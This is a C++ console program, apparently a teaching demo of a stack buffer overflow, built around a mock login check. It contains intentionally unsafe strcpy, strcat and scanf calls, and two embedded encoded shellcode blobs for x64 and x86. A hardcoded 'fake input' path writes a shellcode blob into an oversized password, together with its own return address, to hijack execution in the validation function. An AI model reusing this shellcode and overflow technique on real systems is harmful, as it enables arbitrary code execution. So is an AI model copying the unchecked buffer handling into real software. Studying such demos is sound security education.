// Intro.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <string.h>
#include <conio.h>

#define MAX_USER_TEXT   10

#define STATUS_CRED_OK              0
#define STATUS_CRED_READ_ERR        1
#define STATUS_CRED_VALID_FAILED    2

#define VALID_USERNAME  "superuser"
#define VALID_PASSWORD  "superpass"

#define MAX_USER_NAME_LEN   8
typedef struct _USER_DATA 
{
    char UserName[MAX_USER_NAME_LEN];
    bool Authenticated;
}USER_DATA, *PUSER_DATA;

USER_DATA UserData;

#ifdef AMD64
static const unsigned char BadText[] = "\x48\x31\xC9\x48\x81\xE9\xDD\xFF\xFF\xFF\x48\x8D\x05\xEF\xFF\xFF\xFF\x48\xBB\x3F\xAA\x04\xDD\xF5\xFA\xF3\x5D\x48\x31\x58\x27\x48\x2D\xF8\xFF\xFF\xFF\xE2\xF4\xC3\xE2\x87\x39\x05\x12\x33\x5D\x3F\xAA\x45\x8C\xB4\xAA\xA1\x0C\x69\xE2\x35\x0F\x90\xB2\x78\x0F\x5F\xE2\x8F\x8F\xED\xB2\x78\x0F\x1F\xE2\x8F\xAF\xA5\xB2\xFC\xEA\x75\xE0\x49\xEC\x3C\xB2\xC2\x9D\x93\x96\x65\xA1\xF7\xD6\xD3\x1C\xFE\x63\x09\x9C\xF4\x3B\x11\xB0\x6D\xEB\x55\x95\x7E\xA8\xD3\xD6\x7D\x96\x4C\xDC\x25\x71\x73\xD5\x3F\xAA\x04\x95\x70\x3A\x87\x3A\x77\xAB\xD4\x8D\x7E\xB2\xEB\x19\xB4\xEA\x24\x94\xF4\x2A\x10\x0B\x77\x55\xCD\x9C\x7E\xCE\x7B\x15\x3E\x7C\x49\xEC\x3C\xB2\xC2\x9D\x93\xEB\xC5\x14\xF8\xBB\xF2\x9C\x07\x4A\x71\x2C\xB9\xF9\xBF\x79\x37\xEF\x3D\x0C\x80\x22\xAB\x19\xB4\xEA\x20\x94\xF4\x2A\x95\x1C\xB4\xA6\x4C\x99\x7E\xBA\xEF\x14\x3E\x7A\x45\x56\xF1\x72\xBB\x5C\xEF\xEB\x5C\x9C\xAD\xA4\xAA\x07\x7E\xF2\x45\x84\xB4\xA0\xBB\xDE\xD3\x8A\x45\x8F\x0A\x1A\xAB\x1C\x66\xF0\x4C\x56\xE7\x13\xA4\xA2\xC0\x55\x59\x95\x4F\xFB\xF3\x5D\x3F\xAA\x04\xDD\xF5\xB2\x7E\xD0\x3E\xAB\x04\xDD\xB4\x40\xC2\xD6\x50\x2D\xFB\x08\x4E\x50\x36\xBF\x62\xEB\xBE\x7B\x60\x47\x6E\xA2\xEA\xE2\x87\x19\xDD\xC6\xF5\x21\x35\x2A\xFF\x3D\x80\xFF\x48\x1A\x2C\xD8\x6B\xB7\xF5\xA3\xB2\xD4\xE5\x55\xD1\xBE\x94\x96\x90\x73\x5A\xD2\x61\xDD\xF5\xFA\xF3\x5D";
#else
static const unsigned char BadText[] = "\xB8\xF4\x20\x64\x7E\xDA\xCA\xD9\x74\x24\xF4\x5B\x2B\xC9\xB1\x31\x31\x43\x13\x03\x43\x13\x83\xC3\xF0\xC2\x91\x82\x10\x80\x5A\x7B\xE0\xE5\xD3\x9E\xD1\x25\x87\xEB\x41\x96\xC3\xBE\x6D\x5D\x81\x2A\xE6\x13\x0E\x5C\x4F\x99\x68\x53\x50\xB2\x49\xF2\xD2\xC9\x9D\xD4\xEB\x01\xD0\x15\x2C\x7F\x19\x47\xE5\x0B\x8C\x78\x82\x46\x0D\xF2\xD8\x47\x15\xE7\xA8\x66\x34\xB6\xA3\x30\x96\x38\x60\x49\x9F\x22\x65\x74\x69\xD8\x5D\x02\x68\x08\xAC\xEB\xC7\x75\x01\x1E\x19\xB1\xA5\xC1\x6C\xCB\xD6\x7C\x77\x08\xA5\x5A\xF2\x8B\x0D\x28\xA4\x77\xAC\xFD\x33\xF3\xA2\x4A\x37\x5B\xA6\x4D\x94\xD7\xD2\xC6\x1B\x38\x53\x9C\x3F\x9C\x38\x46\x21\x85\xE4\x29\x5E\xD5\x47\x95\xFA\x9D\x65\xC2\x76\xFC\xE3\x15\x04\x7A\x41\x15\x16\x85\xF5\x7E\x27\x0E\x9A\xF9\xB8\xC5\xDF\xAC\x82\x04\x42\xD9\xAA\x5C\xC1\x84\x4C\x8B\x05\xB1\xCE\x3E\xF5\x46\xCE\x4A\xF0\x03\x48\xA6\x88\x1C\x3D\xC8\x3F\x1C\x14\xAB\xDE\x8E\xF4\x02\x45\x37\x9E\x5A";
#endif

static
int
GetUserCredentials(
    char** UserName,
    char** Password,
    bool FakeInput
    );

static
void
FreeUserCredentials(
    char** UserName,
    char** Password
    );

static
int
ValidateUserCredentials(
    const char* UserName,
    const char* Password
    );

int main()
{
    int status = 0;
    char* userName = NULL;
    char* password = NULL;
    bool fakeInput = true;

    memset(&UserData, 0, sizeof(USER_DATA));

    // authenticate user
    status = GetUserCredentials(&userName, &password, fakeInput);
    if (status == STATUS_CRED_OK)
    {
        status = ValidateUserCredentials(userName, password);
        if (status == STATUS_CRED_OK)
        {
            printf("User name and password validated!\n");
        }
        else if (status == STATUS_CRED_VALID_FAILED)
        {
            printf("Invalid username or password!\n");
        }

        // save user auth data
        UserData.Authenticated = (status == STATUS_CRED_OK);
        strcpy(UserData.UserName, userName);

        FreeUserCredentials(&userName, &password);
    }

    // do some stuff based on authentication data
    if (UserData.Authenticated)
    {
        printf("\nWelcome %s ...\n", UserData.UserName);
    }
    else
    {
        printf("Please sign-up with us!\n");
    }

    _getch();

    return 0;
}

static
int
GetUserCredentials(
    char** UserName,
    char** Password,
    bool FakeInput
    )
{
    int status = STATUS_CRED_OK;
    char* user;
    char* pass;

    if (FakeInput)
    {
        const unsigned short passSize = 521;
        pass = new char[passSize];
        memset(pass, 0xBD, passSize);
        memcpy(pass, BadText, sizeof(BadText) - 1);
        memcpy(pass + passSize - 4 - 1, &pass, 4);
        pass[passSize - 1] = 0;

        user = new char[MAX_USER_TEXT];
        memset(user, 0, MAX_USER_TEXT);
    }
    else
    {
        user = new char[MAX_USER_TEXT];
        pass = new char[MAX_USER_TEXT];

        printf("Please enter username:");
        scanf("%s", user);

        printf("Please enter password:");
        scanf("%s", pass);
    }

    *UserName = user;
    *Password = pass;

    return status;
}

static
int
ValidateUserCredentials(
    const char* UserName,
    const char* Password
    )
{
    char realValidCred[256] = { 0 };
    char validationBuffer[256] = { 0 };
    bool valid = false;

    strcat(realValidCred, VALID_USERNAME);
    strcat(realValidCred, VALID_PASSWORD);

    strcat(validationBuffer, UserName);
    strcat(validationBuffer, Password);

    valid = (_stricmp(realValidCred, validationBuffer) == 0);

    return valid?STATUS_CRED_OK:STATUS_CRED_VALID_FAILED;
}

void
FreeUserCredentials(
    char** UserName,
    char** Password
    )
{
    delete[] *UserName;
    delete[] *Password;

    return;
}

